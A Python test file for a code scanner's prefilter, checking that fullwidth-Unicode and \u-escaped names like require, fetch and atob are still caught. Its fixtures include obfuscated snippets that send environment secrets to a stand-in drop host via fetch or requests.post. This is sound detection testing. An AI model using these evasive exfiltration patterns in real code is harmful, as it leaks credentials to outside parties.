"""`TextGate`: a raw-text prefilter searches the file as its parser reads it, so a name written in
fullwidth letters (Python, NFKC) or with `\\u` escapes (JavaScript) still opens the gate in front of
the reader that finds it. Code-only fixtures: names and calls, no payloads."""

from __future__ import annotations

import re

from cordon_scanner.analysis.shared.text_gate import TextGate
from cordon_scanner.foundation.content import FileContent


class Spell:
    @staticmethod
    def fullwidth(word: str) -> str:
        return "".join(chr(ord(c) + 0xFEE0) if c.isascii() and c.isalpha() else c for c in word)

    @staticmethod
    def escaped(word: str) -> str:
        """`word` with its first letter as a JavaScript `\\uXXXX` escape."""
        return f"\\u{ord(word[0]):04x}{word[1:]}"


class TestTheReadingsOfAText:
    def test_an_ascii_python_text_and_an_unescaped_script_are_read_once(self) -> None:
        assert TextGate.views("import os\n", "python") == ("import os\n",)
        assert TextGate.views("fetch(u)\n", "javascript") == ("fetch(u)\n",)
        assert TextGate.views("caf\u00e9 = 1\n", "python") == ("caf\u00e9 = 1\n",)  # NFKC-stable

    def test_python_is_read_nfkc_normalised(self) -> None:
        text = f"{Spell.fullwidth('subprocess')}.run(x)\n"
        assert TextGate.views(text, "python")[-1] == "subprocess.run(x)\n"
        assert TextGate.views(text, "javascript") == (text,)  # JavaScript keeps them apart

    def test_javascript_escapes_are_decoded(self) -> None:
        assert TextGate.views("\\u0072equire('x')", "javascript")[-1] == "require('x')"
        assert TextGate.views("\\u{72}equire('x')", "typescript")[-1] == "require('x')"
        assert TextGate.views("s = '\\x2e/a'", "javascript")[-1] == "s = './a'"
        assert TextGate.views("\\u0072equire('x')", "python") == ("\\u0072equire('x')",)

    def test_a_gate_opens_on_any_reading_and_stays_shut_on_none(self) -> None:
        words = re.compile(r"\brequire\s*\(")
        assert TextGate.may_hold(words, "\\u0072equire('x')", "javascript")
        assert not TextGate.may_hold(words, "\\u0072equire('x')", "python")
        assert not TextGate.may_hold(words, "const a = 1", "javascript")
        assert TextGate.may_hold(None, "", "javascript")

    def test_a_name_is_read_as_its_parser_reads_it(self) -> None:
        assert TextGate.name(Spell.fullwidth("HOOK"), "python") == "HOOK"
        assert TextGate.name("\\u0048OOK", "javascript") == "HOOK"
        assert TextGate.name("HOOK", "python") == "HOOK"


class TestEachGateOpensOnTheParsersReading:
    @staticmethod
    def js(text: str) -> FileContent:
        return FileContent.from_bytes("pkg/index.js", text.encode("utf-8"))

    def test_an_oversized_script_that_requires_by_an_escaped_name_reaches_out(self) -> None:
        from cordon_scanner.analysis.javascript.flow.summaries import JsSummaries

        assert JsSummaries.reaches_out(f"const m = {Spell.escaped('require')}('./m');\n")
        assert JsSummaries.reaches_out("const m = require('./m');\n")
        assert not JsSummaries.reaches_out("const m = 1;\n")

    def test_the_flow_reader_runs_for_an_escaped_sink(self, monkeypatch) -> None:
        from cordon_scanner.analysis.javascript.js_flow import JsFlow
        from cordon_scanner.detect.code.capability.javascript import JavaScriptCapabilities

        read: list[str] = []
        monkeypatch.setattr(JsFlow, "flows", classmethod(lambda cls, t: read.append(t) or []))
        escaped = f"const k = process.env.KEY;\n{Spell.escaped('fetch')}(u, {{body: k}});\n"
        JavaScriptCapabilities.js_flows(self.js(escaped), "javascript")
        assert len(read) == 1
        JavaScriptCapabilities.js_flows(
            self.js("const k = process.env.KEY;\nlog(k);\n"), "javascript"
        )
        assert len(read) == 1  # no sink in any reading: not read, as before

    def test_the_evaluator_runs_for_an_escaped_marker(self, monkeypatch) -> None:
        from cordon_scanner.analysis.javascript.js_eval import JsEval
        from cordon_scanner.analysis.javascript.js_flow import JsFlow
        from cordon_scanner.detect.code.capability.javascript import JavaScriptCapabilities
        from cordon_scanner.detect.code.capability.labelling import Labelling

        resolved: list[str] = []
        monkeypatch.setattr(JsFlow, "flows", classmethod(lambda cls, t: []))
        monkeypatch.setattr(JsEval, "resolve", classmethod(lambda cls, t: resolved.append(t) or t))
        monkeypatch.setattr(
            JsEval,
            "resolve_with_decodes",
            classmethod(lambda cls, t: resolved.append(t) or (t, [])),
        )
        escaped = f"const h = {Spell.escaped('atob')}('aGk=');\nfetch(h, {{body: process.env}});\n"
        assert not JavaScriptCapabilities.JS_EVAL_MARKERS.search(escaped)
        JavaScriptCapabilities.js_flows(self.js(escaped), "javascript")
        Labelling.folded_capabilities(self.js(escaped), (), "javascript", [])
        assert len(resolved) == 2
        plain = "const h = 'x';\nfetch(h, {body: process.env});\n"
        JavaScriptCapabilities.js_flows(self.js(plain), "javascript")
        Labelling.folded_capabilities(self.js(plain), (), "javascript", [])
        assert len(resolved) == 2  # no marker in any reading: not evaluated, as before

    def test_a_fullwidth_binding_of_a_sent_name_keeps_its_label(self) -> None:
        from cordon_scanner.detect.code.capability.destinations import DestinationLabels

        hook = Spell.fullwidth("HOOK")
        source = f"{hook} = 'https://drop.example/x'\nrequests.post(HOOK, data=d)\n"
        assert DestinationLabels._bound_to_a_send({1}, {2}, source) == {1}
        alone = f"{hook} = 'https://drop.example/x'\n"
        assert DestinationLabels._bound_to_a_send({1}, set(), alone, frozenset({"HOOK"})) == {1}
        plain = "OTHER = 'https://drop.example/x'\nrequests.post(HOOK, data=d)\n"
        assert DestinationLabels._bound_to_a_send({1}, {2}, plain) == set()
